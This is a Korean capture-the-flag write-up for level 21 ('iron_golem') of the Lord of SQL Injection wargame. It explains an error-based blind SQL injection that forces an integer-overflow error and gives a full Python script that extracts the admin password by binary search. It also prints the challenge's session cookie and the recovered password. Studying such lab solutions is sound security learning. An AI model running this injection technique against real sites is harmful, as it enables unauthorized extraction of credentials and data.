---
title: LOS - 21번 iron_golem
category: Lord of SQL Injection
---

# [21] iron_golem

## 문제
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcPwCAb%2FbtrnN2IAMBF%2FDQ6Tb1nf7xL43zwK3VJjqk%2Fimg.png">

## 풀이

solve 조건은 admin 계정의 pw를 알아내는 것이다.

<br> 

preg_match를 살펴보면 sleep과 benchmark를 필터링하고 있다.

두 함수 모두 Time Based Blind SQLi에 쓰이는 함수다.

.과 _등을 함께 필터링하므로 헤비쿼리도 사용이 불가능하다.

Timed Based로 접근하기 위한 방법이 모두 막혔으므로, 다른 방식으로 푸는 문제임을 유추할 수 있다.

* 헤비쿼리 : information_schema.columns 등을 여러개 join시켜 내부 데이터를 왕창 읽어들임으로써 시간을 지연시키는 방법이다.

<br> 

또한 지금까지의 문제들처럼 쿼리의 실행 결과를 보여주는 대신, 에러 발생 시 에러 메시지를 보여주고 있다.

* Hello {$result[id]} → mysqli_error($db)

<br> 

이러한 점들로 미루어 보아, **Error Based**로 접근해야하는 문제임을 짐작할 수 있다.

Timed Based나 Error Based에 대해 제대로 공부해본 적이 없었기 때문에 여기까지 결론을 내리는데 많은 시간이 소요되었다...

<br> 

고의적으로 에러를 발생시키는 방법에는 여러가지가 있다.

* 이 때, 발생시켜야하는 에러는 Syntax Error가 아닌 Runtime Error이다.

<br> 

그 중 개인적으로 가장 간단하다고 생각한 방법인 **큰 수 연산**을 통해 문제를 해결해보았다.

말 그대로, Integer 범위를 초과하는 과도한 연산을 요청함으로써 에러를 발생시키는 방법이다.

<br> 

먼저, 과도하게 큰 수의 연산을 요청했을 시의 에러 메시지의 내용을 확인해본다.

<br> 

다음은 pw의 페이로드로 **' or 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF** 를 주었을 시의 에러 메시지의 내용이다.

<br>

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcV5YE2%2FbtrnHQ9Yybo%2FRNhtCVTKtlnkiJ43qeGg8k%2Fimg.png">

<br>

위 에러 메시지 내용의 일부를 키워드로 활용하여 자동화 코드를 짜면 된다.

나는 **out of range**를 선택했다.

- res.text에 out of range가 포함되어있을 시 에러가 발생한 것으로 판별한다.

<br> 

pw의 길이를 찾았을 시 에러를 발생시키기 위한 페이로드의 예시는 다음과 같다.

```python
param=f"?pw=' or id='admin' and if(length(pw)={num}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23"
```

이후 완전한 pw를 찾는 방법도 동일한 로직을 사용한다.

특정 인덱스의 아스키를 찾았을 시 에러를 발생시켜주면 된다.

<br> 

또한 이번 문제에서도 검색 속도를 높이기 위해 2진 탐색을 적용해준다.

<br>

**LoS 21번 Python 자동화 코드**이다.

```python
import requests

def send(param):
    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
    cookie = "dfksep8hnmequ6sm0qe1iu65pa"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("💘 LoS 21을 시작합니다")

for num in range(0,100):
    param=f"?pw=' or id='admin' and if(length(pw)={num}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23"
    if("out of range" in send(param)):
        print(f"👏 pw의 길이는 {num}입니다!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?pw=' or id=\"admin\" and if(ascii(substr(pw,{len},1))>={middle}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23"
        if("out of range" in send(param)):
            param=f"?pw=' or id=\"admin\" and if(ascii(substr(pw,{len},1))={middle}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23"
            if("out of range" in send(param)):
                print(f"{len}번째 문자 → {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"👏 pw의 정체는 [{ans}]입니다!")
```

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FlzbFA%2FbtrnR3lVWQ4%2FOP9KfPRWEIVTnk5vlbLbG1%2Fimg.png">

Blind 공격 결과, pw는 `06b5a6c16e8830475f983cc3a825ee9a` 임을 확인할 수 있다.


## 결과
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FbvUIOy%2FbtrnHSz1mvI%2FmWvA84g3zRa4OBEfXhTkj1%2Fimg.png">